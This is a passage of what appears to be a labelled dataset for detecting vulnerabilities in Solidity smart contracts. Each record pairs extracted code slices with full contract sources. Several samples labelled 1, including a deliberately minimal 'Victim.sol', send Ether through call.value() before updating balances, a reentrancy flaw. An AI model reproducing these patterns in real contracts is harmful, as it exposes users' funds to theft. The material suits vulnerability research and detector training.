>= value ); require( value <= allowances_[from][msg.sender] ); balances_[from] -= value; allowances_[from][msg.sender] -= value; totalSupply -= value; Burn( from, value ); return true; } function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) { _transfer( msg.sender, to, value, data ); require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data)); return true; } function transfer( address to, uint value, bytes data ) public  returns (bool success)  { if (isContract(to)) { return transferToContract( to, value, data ); } _transfer( msg.sender, to, value, data ); return true; } function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  { _transfer( msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); if (isContract(rx)) { rx.tokenFallback( msg.sender, value, data ); return true; } return false; } function isContract( address _addr ) private constant returns (bool) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } function _transfer( address from,   address to,  uint value,   bytes data ) internal  { require( to != 0x0 ); require( balances_[from] >= value ); require( balances_[to] + value > balances_[to] ); balances_[from] -= value; balances_[to] += value; bytes memory ignore; ignore = data; Transfer( from, to, value ); } } "}
{"sol name": "35617.sol", "label": 0, "first path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "second path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "third path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "long path": "pragma solidity ^0.4.11; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { assert(b > 0); uint c = a / b; assert(a == b * c + a % b); return c; } } contract Token { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && _value > 0) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; } contract MoldCoin is StandardToken, SafeMath { string public name = \"MOLD\"; string public symbol = \"MLD\"; uint public decimals = 18; uint public startDatetime; uint public firstStageDatetime; uint public secondStageDatetime; uint public endDatetime; address public founder; address public admin; uint public coinAllocation = 20 * 10**8 * 10**decimals; uint public angelAllocation = 2 * 10**8 * 10**decimals; uint public founderAllocation = 3 * 10**8 * 10**decimals; bool public founderAllocated = false; uint public saleTokenSupply = 0; uint public salesVolume = 0; uint public angelTokenSupply = 0; bool public halted = false; event Buy(address indexed sender, uint eth, uint tokens); event AllocateFounderTokens(address indexed sender, uint tokens); event AllocateAngelTokens(address indexed sender, address to, uint tokens); event AllocateUnsoldTokens(address indexed sender, address holder, uint tokens); modifier onlyAdmin { require(msg.sender == admin); _; } modifier duringCrowdSale { require(block.timestamp >= startDatetime && block.timestamp <= endDatetime); _; } function MoldCoin(uint startDatetimeInSeconds, address founderWallet) { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; firstStageDatetime = startDatetime + 120 * 1 hours; secondStageDatetime = firstStageDatetime + 240 * 1 hours; endDatetime = secondStageDatetime + 2040 * 1 hours; } function price(uint timeInSeconds) constant returns(uint) { if (timeInSeconds < startDatetime) return 0; if (timeInSeconds <= firstStageDatetime) return 15000; if (timeInSeconds <= secondStageDatetime) return 12000; if (timeInSeconds <= endDatetime) return 10000; return 0; } function buy() payable { buyRecipient(msg.sender); } function() payable { buyRecipient(msg.sender); } function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); } function allocateFounderTokens() onlyAdmin { require( block.timestamp > endDatetime ); require(!founderAllocated); balances[founder] = safeAdd(balances[founder], founderAllocation); totalSupply = safeAdd(totalSupply, founderAllocation); founderAllocated = true; AllocateFounderTokens(msg.sender, founderAllocation); } function allocateAngelTokens(address angel, uint tokens) onlyAdmin { require(safeAdd(angelTokenSupply,tokens) <= angelAllocation ); balances[angel] = safeAdd(balances[angel], tokens); angelTokenSupply = safeAdd(angelTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateAngelTokens(msg.sender, angel, tokens); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function arrangeUnsoldTokens(address holder, uint256 tokens) onlyAdmin { require( block.timestamp > endDatetime ); require( safeAdd(saleTokenSupply,tokens) <= coinAllocation ); require( balances[holder] >0 ); balances[holder] = safeAdd(balances[holder], tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateUnsoldTokens(msg.sender, holder, tokens); } } contract MoldCoinBonus is SafeMath { function bonusBalanceOf(address _owner) constant returns (uint256 balance) { return bonusBalances[_owner]; } mapping (address => uint256) bonusBalances; address public admin; MoldCoin public fundAddress; uint public rate = 10; uint public totalSupply = 0; bool public halted = false; event BuyWithBonus(address indexed sender, address indexed inviter, uint eth, uint tokens, uint bonus); event BuyForFriend(address indexed sender, address indexed friend, uint eth, uint tokens, uint bonus); modifier onlyAdmin { require(msg.sender == admin); _; } modifier validSale { require(!halted); require(!fundAddress.halted()); _; } function MoldCoinBonus(MoldCoin _fundAddress, uint _rate) { admin = msg.sender; fundAddress = _fundAddress; rate = _rate; } function buyWithBonus(address inviter) validSale payable { require( msg.sender != inviter ); uint tokens = safeMul(msg.value, fundAddress.price(block.timestamp)); uint bonus = safeDiv(safeMul(tokens, rate), 100); fundAddress.buyRecipient.value(msg.value)(msg.sender); totalSupply = safeAdd(totalSupply, bonus*2); bonusBalances[inviter] = safeAdd(bonusBalances[inviter], bonus); bonusBalances[msg.sender] = safeAdd(bonusBalances[msg.sender], bonus); BuyWithBonus(msg.sender, inviter, msg.value, tokens, bonus); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function changeRate(uint _rate) onlyAdmin  { rate = _rate; } } "}
{"sol name": "19128.sol", "label": 1, "first path": "function doWithdraw(address from, address to, uint256 amount) internal { require(amount <= MAX_WITHDRAWAL); require(balances[from] >= amount); require(withdrawalCount[from] < 3); balances[from] = balances[from].sub(amount); to.call.value(amount)(); withdrawalCount[from] = withdrawalCount[from].add(1); function withdraw(uint256 amount) public { doWithdraw(msg.sender, msg.sender, amount); function withdrawTo(address to, uint256 amount) public { doWithdraw(msg.sender, to, amount); function withdrawFor(address from, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, msg.sender, amount); function withdrawForTo(address from, address to, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, to, amount); ", "second path": "function doWithdraw(address from, address to, uint256 amount) internal { require(amount <= MAX_WITHDRAWAL); require(balances[from] >= amount); require(withdrawalCount[from] < 3); balances[from] = balances[from].sub(amount); to.call.value(amount)(); withdrawalCount[from] = withdrawalCount[from].add(1); function withdraw(uint256 amount) public { doWithdraw(msg.sender, msg.sender, amount); function withdrawTo(address to, uint256 amount) public { doWithdraw(msg.sender, to, amount); function withdrawFor(address from, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, msg.sender, amount); function withdrawForTo(address from, address to, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, to, amount); ", "third path": "function doWithdraw(address from, address to, uint256 amount) internal { require(amount <= MAX_WITHDRAWAL); require(balances[from] >= amount); require(withdrawalCount[from] < 3); balances[from] = balances[from].sub(amount); to.call.value(amount)(); withdrawalCount[from] = withdrawalCount[from].add(1); function withdraw(uint256 amount) public { doWithdraw(msg.sender, msg.sender, amount); function withdrawTo(address to, uint256 amount) public { doWithdraw(msg.sender, to, amount); function withdrawFor(address from, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, msg.sender, amount); function withdrawForTo(address from, address to, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, to, amount); ", "long path": "pragma solidity ^0.4.15; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract HODLWallet { using SafeMath for uint256; address internal owner; mapping(address => uint256) public balances; mapping(address => uint256) public withdrawalCount; mapping(address => mapping(address => bool)) public approvals; uint256 public constant MAX_WITHDRAWAL = 0.002 * 1000000000000000000; modifier onlyOwner() { require(msg.sender == owner); _; } function HODLWallet(address[] addrs, uint256[] _balances) public payable { require(addrs.length == _balances.length); owner = msg.sender; for (uint256 i = 0; i < addrs.length; i++) { balances[addrs[i]] = _balances[i]; withdrawalCount[addrs[i]] = 0; } } function doWithdraw(address from, address to, uint256 amount) internal { require(amount <= MAX_WITHDRAWAL); require(balances[from] >= amount); require(withdrawalCount[from] < 3); balances[from] = balances[from].sub(amount); to.call.value(amount)(); withdrawalCount[from] = withdrawalCount[from].add(1); } function () payable public{ deposit(); } function doDeposit(address to) internal { require(msg.value > 0); balances[to] = balances[to].add(msg.value); } function deposit() payable public { doDeposit(msg.sender); } function depositTo(address to) payable public { doDeposit(to); } function withdraw(uint256 amount) public { doWithdraw(msg.sender, msg.sender, amount); } function withdrawTo(address to, uint256 amount) public { doWithdraw(msg.sender, to, amount); } function withdrawFor(address from, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, msg.sender, amount); } function withdrawForTo(address from, address to, uint256 amount) public { require(approvals[from][msg.sender]); doWithdraw(from, to, amount); } function destroy() public onlyOwner { selfdestruct(owner); } function getBalance(address toCheck) public constant returns (uint256) { return balances[toCheck]; } function addBalances(address[] addrs, uint256[] _balances) public payable onlyOwner { require(addrs.length == _balances.length); for (uint256 i = 0; i < addrs.length; i++) { balances[addrs[i]] = _balances[i]; withdrawalCount[addrs[i]] = 0; } } function approve(address toApprove) public { require(balances[msg.sender] > 0); approvals[msg.sender][toApprove] = true; } function unapprove(address toUnapprove) public { require(balances[msg.sender] > 0); approvals[msg.sender][toUnapprove] = false; } } "}
{"sol name": "Victim.sol", "label": 1, "first path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; ", "second path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; ", "third path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; ", "long path": "pragma solidity ^0.4.8; contract Victim { mapping(address => uint) public balances; function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; } balances[msg.sender] -= _amount; } } function deposit() payable {} } "}
{"sol name": "25808.sol", "label": 1, "first path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "second path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "third path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "long path": "pragma solidity ^0.4.19; contract Token { function transfer(address _to, uint _value) returns (bool success); function balanceOf(address _owner) constant returns (uint balance); } contract EtherGet { address owner; function EtherGet() { owner = msg.sender; } function withdrawTokens(address tokenContract) public { Token tc = Token(tokenContract); tc.transfer(owner, tc.balanceOf(this)); } function withdrawEther() public { owner.transfer(this.balance); } function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); } } } "}
{"sol name": "21111.sol", "label": 0, "first path": "function submitPool(uint amountInWei) public onlyOwner noReentrancy { require(contractStage < 3); require(receiverAddress != 0x00); require(block.number >= addressChangeBlock.add(6000)); require(contributionMin <= amountInWei && amountInWei <= this.balance); finalBalance = this.balance; require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))()); if (this.balance > 0) ethRefundAmount.push(this.balance); contractStage = 3; PoolSubmitted(receiverAddress, amountInWei); ", "second path": "function submitPool(uint amountInWei) public onlyOwner noReentrancy { require(contractStage < 3); require(receiverAddress != 0x00); require(block.number >= addressChangeBlock.add(6000)); require(contributionMin <= amountInWei && amountInWei <= this.balance); finalBalance = this.balance; require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))()); if (this.balance > 0) ethRefundAmount.push(this.balance); contractStage = 3; PoolSubmitted(receiverAddress, amountInWei); ", "third path": "function submitPool(uint amountInWei) public onlyOwner noReentrancy { require(contractStage < 3); require(receiverAddress != 0x00); require(block.number >= addressChangeBlock.add(6000)); require(contributionMin <= amountInWei && amountInWei <= this.balance); finalBalance = this.balance; require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))()); if (this.balance > 0) ethRefundAmount.push(this.balance); contractStage = 3; PoolSubmitted(receiverAddress, amountInWei); ", "long path": "pragma solidity ^0.4.19; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ERC20 { function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} } contract WhiteList { function checkMemberLevel (address addr) view public returns (uint) {} } contract PresalePool { using SafeMath for uint; uint8 public contractStage = 1; address public owner; uint[] public contributionCaps; uint public feePct; address public receiverAddress; uint constant public contributionMin = 100000000000000000; uint constant public maxGasPrice = 50000000000; WhiteList constant public whitelistContract = WhiteList(0x8D95B038cA80A986425FA240C3C17Fb2B6e9bc63); uint public nextCapTime; uint [] public nextContributionCaps; uint public addressChangeBlock; uint public finalBalance; uint[] public ethRefundAmount; address public activeToken; struct Contributor { bool authorized; uint ethRefund; uint balance; uint cap; mapping (address => uint) tokensClaimed; } mapping (address => Contributor) whitelist; struct TokenAllocation { ERC20 token; uint[] pct; uint balanceRemaining; } mapping (address => TokenAllocation) distributionMap; modifier onlyOwner () { require (msg.sender == owner); _; } bool locked; modifier noReentrancy() { require(!locked); locked = true; _; locked = false; } event ContributorBalanceChanged (address contributor, uint totalBalance); event ReceiverAddressSet ( address _addr); event PoolSubmitted (address receiver, uint amount); event WithdrawalsOpen (address tokenAddr); event EthRefundReceived (address sender, uint amount); event EthRefunded (address receiver, uint amount); event TokensWithdrawn (address receiver, address token, uint amount); event ERC223Received (address token, uint value); function _toPct (uint numerator, uint denominator ) internal pure returns (uint) { return numerator.mul(10 ** 20) / denominator; } function _applyPct (uint numerator, uint pct) internal pure returns (uint) { return numerator.mul(pct) / (10 ** 20); } function PresalePool(address receiverAddr, uint[] capAmounts, uint fee) public { require (fee < 100); require (capAmounts.length>1 && capAmounts.length<256); for (uint8 i=1; i<capAmounts.length; i++) { require (capAmounts[i] <= capAmounts[0]); } owner = msg.sender; receiverAddress = receiverAddr; contributionCaps = capAmounts; feePct = _toPct(fee,100); whitelist[msg.sender].authorized = true; } function () payable public { if (contractStage == 1) { _ethDeposit(); } else if (contractStage == 3) { _ethRefund(); } else revert(); } function _ethDeposit () internal { assert (contractStage == 1); require (tx.gasprice <= maxGasPrice); require (this.balance <= contributionCaps[0]); var c = whitelist[msg.sender]; uint newBalance = c.balance.add(msg.value); require (newBalance >= contributionMin); require (newBalance <= _checkCap(msg.sender)); c.balance = newBalance; ContributorBalanceChanged(msg.sender, newBalance); } function _ethRefund () internal { assert (contractStage == 3); require (msg.sender == owner || msg.sender == receiverAddress); require (msg.value >= contributionMin); ethRefundAmount.push(msg.value); EthRefundReceived(msg.sender, msg.value); } function withdraw (address tokenAddr) public { var c = whitelist[msg.sender]; require (c.balance > 0); if (contractStage < 3) { uint amountToTransfer = c.balance; c.balance = 0; msg.sender.transfer(amountToTransfer); ContributorBalanceChanged(msg.sender, 0); } else { _withdraw(msg.sender,tokenAddr); } } function withdrawFor (address contributor, address tokenAddr) public onlyOwner { require (contractStage == 3); require (whitelist[contributor].balance > 0); _withdraw(contributor,tokenAddr); } function _withdraw (address receiver, address tokenAddr) internal { assert (contractStage == 3); var c = whitelist[receiver]; if (tokenAddr == 0x00) { tokenAddr = activeToken; } var d = distributionMap[tokenAddr]; require ( (ethRefundAmount.length > c.ethRefund) || d.pct.length > c.tokensClaimed[tokenAddr] ); if (ethRefundAmount.length > c.ethRefund) { uint pct = _toPct(c.balance,finalBalance); uint ethAmount = 0; for (uint i=c.ethRefund; i<ethRefundAmount.length; i++) { ethAmount = ethAmount.add(_applyPct(ethRefundAmount[i],pct)); } c.ethRefund = ethRefundAmount.length; if (ethAmount > 0) { receiver.transfer(ethAmount); EthRefunded(receiver,ethAmount); } } if (d.pct.length > c.tokensClaimed[tokenAddr]) { uint tokenAmount = 0; for (i=c.tokensClaimed[tokenAddr]; i<d.pct.length; i++) { tokenAmount = tokenAmount.add(_applyPct(c.balance,d.pct[i])); } c.tokensClaimed[tokenAddr] = d.pct.length; if (tokenAmount > 0) { require(d.token.transfer(receiver,tokenAmount)); d.balanceRemaining = d.balanceRemaining.sub(tokenAmount); TokensWithdrawn(receiver,tokenAddr,tokenAmount); } } } function authorize (address addr, uint cap) public onlyOwner { require (contractStage == 1); _checkWhitelistContract(addr); require (!whitelist[addr].authorized); require ((cap > 0 && cap < contributionCaps.length) || (cap >= contributionMin && cap <= contributionCaps[0]) ); uint size; assembly { size := extcodesize(addr) } require (size == 0); whitelist[addr].cap = cap; whitelist[addr].authorized = true; } function authorizeMany (address[] addr, uint cap) public onlyOwner { require (addr.length < 255); require (cap > 0 && cap < contributionCaps.length); for (uint8 i=0; i<addr.length; i++) { authorize(addr[i], cap); } } function revoke (address addr) public onlyOwner { require (contractStage < 3); require (whitelist[addr].authorized); require (whitelistContract.checkMemberLevel(addr) == 0); whitelist[addr].authorized = false; if (whitelist[addr].balance > 0) { uint amountToTransfer = whitelist[addr].balance; whitelist[addr].balance = 0; addr.transfer(amountToTransfer); ContributorBalanceChanged(addr, 0); } } function modifyIndividualCap (address addr, uint cap) public onlyOwner { require (contractStage < 3); require (cap < contributionCaps.length || (cap >= contributionMin && cap <= contributionCaps[0]) ); _checkWhitelistContract(addr); var c = whitelist[addr]; require (c.authorized); uint amount = c.balance; c.cap = cap; uint capAmount = _checkCap(addr); if (amount > capAmount) { c.balance = capAmount; addr.transfer(amount.sub(capAmount)); ContributorBalanceChanged(addr, capAmount); } } function modifyLevelCap (uint level, uint cap) public onlyOwner { require (contractStage < 3); require (level > 0 && level < contributionCaps.length); require (this.balance <= cap && contributionCaps[0] >= cap); contributionCaps[level] = cap; nextCapTime = 0; } function modifyAllLevelCaps (uint[] cap, uint time) public onlyOwner { require (contractStage < 3); require (cap.length == contributionCaps.length-1); require (time == 0 || time>block.timestamp); if (time == 0) { for (uint8 i = 0; i < cap.length; i++) { modifyLevelCap(i+1, cap[i]); } } else { nextContributionCaps = contributionCaps; nextCapTime = time; for (i = 0; i < cap.length; i++) { require (contributionCaps[i+1] <= cap[i] && contributionCaps[0] >= cap[i]); nextContributionCaps[i+1] = cap[i]; } } } function modifyMaxContractBalance (uint amount) public onlyOwner { require (contractStage < 3); require (amount >= contributionMin); require (amount >= this.balance); contributionCaps[0] = amount; nextCapTime = 0; for (uint8 i=1; i<contributionCaps.length; i++) { if (contributionCaps[i]>amount) contributionCaps[i]=amount; } } function _checkCap (address addr) internal returns (uint) { _checkWhitelistContract(addr); var c = whitelist[addr]; if (!c.authorized) return 0; if (nextCapTime>0 && block.timestamp>nextCapTime) { contributionCaps = nextContributionCaps; nextCapTime = 0; } if (c.cap<contributionCaps.length) return contributionCaps[c.cap]; return c.cap; } function _checkWhitelistContract (address addr) internal { var c = whitelist[addr]; if (!c.authorized) { var level = whitelistContract.checkMemberLevel(addr); if (level == 0 || level >= contributionCaps.length) return; c.cap = level; c.authorized = true; } } function checkPoolBalance () view public returns (uint poolCap, uint balance, uint remaining) { if (contractStage == 1) { remaining = contributionCaps[0].sub(this.balance); } else { remaining = 0; } return (contributionCaps[0],this.balance,remaining); } function checkContributorBalance (address addr) view public returns (uint balance, uint cap, uint remaining) { var c = whitelist[addr]; if (!c.authorized) { cap = whitelistContract.checkMemberLevel(addr); if (cap == 0) return (0,0,0); } else { cap = c.cap; } balance = c.balance; if (contractStage == 1) { if (cap<contributionCaps.length) { if (nextCapTime == 0 || nextCapTime > block.timestamp) { cap = contributionCaps[cap]; } else { cap = nextContributionCaps[cap]; } } remaining = cap.sub(balance); if (contributionCaps[0].sub(this.balance) < remaining) remaining = contributionCaps[0].sub(this.balance); } else { remaining = 0; } return (balance, cap, remaining); } function checkAvailableTokens (address addr, address tokenAddr) view public returns (uint tokenAmount) { var c = whitelist[addr]; var d = distributionMap[tokenAddr]; for (uint i = c.tokensClaimed[tokenAddr]; i < d.pct.length; i++) { tokenAmount = tokenAmount.add(_applyPct(c.balance, d.pct[i])); } return tokenAmount; } function closeContributions () public onlyOwner { require (contractStage == 1); contractStage = 2; } function reopenContributions () public onlyOwner { require (contractStage == 2); contractStage = 1; } function setReceiverAddress (address addr) public onlyOwner { require (addr != 0x00 && receiverAddress == 0x00); require (contractStage < 3); receiverAddress = addr; addressChangeBlock = block.number; ReceiverAddressSet(addr); } function submitPool(uint amountInWei) public onlyOwner noReentrancy { require(contractStage < 3); require(receiverAddress != 0x00); require(block.number >= addressChangeBlock.add(6000)); require(contributionMin <= amountInWei && amountInWei <= this.balance); finalBalance = this.balance; require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))()); if (this.balance > 0) ethRefundAmount.push(this.balance); contractStage = 3; PoolSubmitted(receiverAddress, amountInWei); } function enableTokenWithdrawals (address tokenAddr, bool notDefault) public onlyOwner noReentrancy { require (contractStage == 3); if (notDefault) { require (activeToken != 0x00); } else { activeToken = tokenAddr; } var d = distributionMap[tokenAddr]; if (d.pct.length==0) d.token = ERC20(tokenAddr); uint amount = d.token.balanceOf(this).sub(d.balanceRemaining); require (amount > 0); if (feePct > 0) { require (d.token.transfer(owner,_applyPct(amount,feePct))); } amount = d.token.balanceOf(this).sub(d.balanceRemaining); d.balanceRemaining = d.token.balanceOf(this); d.pct.push(_toPct(amount,finalBalance)); } function tokenFallback (address from, uint value, bytes data) public { ERC223Received (from, value); } } "}
{"sol name": "33501.sol", "label": 0, "first path": "function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (!txn.destination.call.value(txn.value)(txn.data)) revert(); Execution(transactionId); function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.18; contract ERC20Interface { function totalSupply() public constant returns (uint256 _totalSupply); function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool success); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract Gifto is ERC20Interface { uint public constant decimals = 5; string public constant symbol = \"Gifto\"; string public constant name = \"Gifto\"; bool public _selling = false; uint public _totalSupply = 10 ** 14; uint public _originalBuyPrice = 10 ** 10; address public owner; mapping(address => uint256) balances; mapping(address => bool) approvedInvestorList; mapping(address => uint256) deposit; address[] buyers; uint _icoPercent = 10; uint public _icoSupply = _totalSupply * _icoPercent / 100; uint public _minimumBuy = 10 ** 17; uint public _maximumBuy = 30 * 10 ** 18; modifier onlyOwner() { require(msg.sender == owner); _; } modifier onlyNotOwner() { require(msg.sender != owner); _; } modifier onSale() { require(_selling && (_icoSupply > 0) ); _; } modifier validOriginalBuyPrice() { require(_originalBuyPrice > 0); _; } modifier validInvestor() { require(approvedInvestorList[msg.sender]); _; } modifier validValue(){ require ( (msg.value >= _minimumBuy) && ( (deposit[msg.sender] + msg.value) <= _maximumBuy) ); _; } function() public payable validValue { if (deposit[msg.sender] == 0 && msg.value != 0){ buyers.push(msg.sender); } deposit[msg.sender] += msg.value; } function Gifto() public { owner = msg.sender; balances[owner] = _totalSupply; Transfer(0x0, owner, _totalSupply); } function totalSupply() public constant returns (uint256) { return _totalSupply; } function setIcoPercent(uint256 newIcoPercent) public onlyOwner returns (bool){ _icoPercent = newIcoPercent; _icoSupply = _totalSupply * _icoPercent / 100; } function setMinimumBuy(uint256 newMinimumBuy) public onlyOwner returns (bool){ _minimumBuy = newMinimumBuy; } function setMaximumBuy(uint256 newMaximumBuy) public onlyOwner returns (bool){ _maximumBuy = newMaximumBuy; } function balanceOf(address _addr) public constant returns (uint256) { return balances[_addr]; } function isApprovedInvestor(address _addr) public constant returns (bool) { return approvedInvestorList[_addr]; } function filterBuyers(bool isInvestor) private constant returns(address[] filterList){ address[] memory filterTmp = new address[](buyers.length); uint count = 0; for (uint i = 0; i < buyers.length; i++){ if(approvedInvestorList[buyers[i]] == isInvestor){ filterTmp[count] = buyers[i]; count++; } } filterList = new address[](count); for (i = 0; i < count; i++){ if(filterTmp[i] != 0x0){ filterList[i] = filterTmp[i]; } } } function getInvestorBuyers() public constant returns(address[]){ return filterBuyers(true); } function getNormalBuyers() public constant returns(address[]){ return filterBuyers(false); } function getDeposit(address _addr) public constant returns(uint256){ return deposit[_addr]; } function getTotalDeposit() public constant returns(uint256 totalDeposit){ totalDeposit = 0; for (uint i = 0; i < buyers.length; i++){ totalDeposit += deposit[buyers[i]]; } } function deliveryToken(bool isInvestor) public onlyOwner validOriginalBuyPrice { uint256 sum = 0; for (uint i = 0; i < buyers.length; i++){ if(approvedInvestorList[buyers[i]] == isInvestor) { uint256 requestedUnits = deposit[buyers[i]] / 